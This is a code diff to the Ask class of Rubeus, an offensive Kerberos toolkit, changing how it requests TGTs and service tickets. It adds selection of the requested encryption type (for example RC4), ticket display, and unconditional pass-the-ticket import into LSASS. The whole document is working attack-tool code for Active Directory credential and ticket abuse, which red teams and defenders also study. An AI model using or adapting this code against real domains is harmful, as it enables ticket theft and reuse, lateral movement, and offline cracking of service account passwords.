@@ -7,7 +7,7 @@ namespace Rubeus
 {
     public class Ask
     {
-        public static byte[] TGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, bool ptt, string domainController = "", Interop.LUID luid = new Interop.LUID())
+        public static byte[] TGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, bool ptt, string domainController = "", Interop.LUID luid = new Interop.LUID(), bool describe = false)
         {
             Console.WriteLine("[*] Action: Ask TGT\r\n");
 
@@ -146,6 +146,12 @@ namespace Rubeus
                     LSA.ImportTicket(kirbiBytes, luid);
                 }
 
+                if(describe)
+                {
+                    KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
+                    LSA.DisplayTicket(kirbi);
+                }
+
                 return kirbiBytes;
             }
             else if (responseTag == 30)
@@ -162,24 +168,33 @@ namespace Rubeus
             }
         }
 
-        public static void TGS(KRB_CRED kirbi, string service, bool ptt = false, string domainController = "", bool display = true)
+        public static void TGS(KRB_CRED kirbi, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, bool ptt = false, string domainController = "", bool display = true)
         {
+            // kirbi            = the TGT .kirbi to use for ticket requests
+            // service          = the SPN being requested
+            // requestEType     = specific encryption type for the request, Interop.KERB_ETYPE.subkey_keymaterial implies default
+            // ptt              = "pass-the-ticket" so apply the ticket to the current logon session
+            // domainController = the specific domain controller to send the request, defaults to the system's DC
+            // display          = true to display the ticket
+
             // extract out the info needed for the TGS-REQ request
             string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
             string domain = kirbi.enc_part.ticket_info[0].prealm;
             Ticket ticket = kirbi.tickets[0];
             byte[] clientKey = kirbi.enc_part.ticket_info[0].key.keyvalue;
-            Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;
+
+            // the etype for the PA Data for the request, so needs to match the TGT key type
+            Interop.KERB_ETYPE paEType = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;
 
             string[] services = service.Split(',');
             foreach (string sname in services) {
-                // request the new service tickt
-                TGS(userName, domain, ticket, clientKey, etype, sname, ptt, domainController, display);
+                // request the new service ticket
+                TGS(userName, domain, ticket, clientKey, paEType, sname, requestEType, ptt, domainController, display);
                 Console.WriteLine();
             }
         }
 
-        public static byte[] TGS(string userName, string domain, Ticket providedTicket, byte[] clientKey, Interop.KERB_ETYPE etype, string service, bool ptt, string domainController = "", bool display = true, bool rc4 = false)
+        public static byte[] TGS(string userName, string domain, Ticket providedTicket, byte[] clientKey, Interop.KERB_ETYPE paEType, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, bool ptt = false, string domainController = "", bool display = true)
         {
             if (display)
             {
@@ -191,10 +206,19 @@ namespace Rubeus
 
             if (display)
             {
+                if (requestEType == Interop.KERB_ETYPE.subkey_keymaterial)
+                {
+                    Console.WriteLine("[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket", requestEType);
+                }
+                else
+                {
+                    Console.WriteLine("[*] Requesting '{0}' etype for the service ticket", requestEType);
+                }
+                
                 Console.WriteLine("[*] Building TGS-REQ request for: '{0}'", service);
             }
 
-            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, service, providedTicket, clientKey, etype, false, "", rc4);
+            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, service, providedTicket, clientKey, paEType, requestEType, false, "");
 
             byte[] response = Networking.SendBytes(dcIP, 88, tgsBytes);
             if (response == null)
@@ -220,7 +244,7 @@ namespace Rubeus
                 TGS_REP rep = new TGS_REP(responseAsn);
 
                 // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
-                byte[] outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);
+                byte[] outBytes = Crypto.KerberosDecrypt(paEType, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);
                 AsnElt ae = AsnElt.Decode(outBytes, false);
                 EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);
 
@@ -273,6 +297,12 @@ namespace Rubeus
 
                 string kirbiString = Convert.ToBase64String(kirbiBytes);
 
+                if (ptt)
+                {
+                    // pass-the-ticket -> import into LSASS
+                    LSA.ImportTicket(kirbiBytes, new Interop.LUID());
+                }
+
                 if (display)
                 {
                     Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);
@@ -282,11 +312,10 @@ namespace Rubeus
                     {
                         Console.WriteLine("      {0}", line);
                     }
-                    if (ptt)
-                    {
-                        // pass-the-ticket -> import into LSASS
-                        LSA.ImportTicket(kirbiBytes, new Interop.LUID());
-                    }
+
+                    KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
+                    LSA.DisplayTicket(kirbi);
+
                     return kirbiBytes;
                 }
                 else
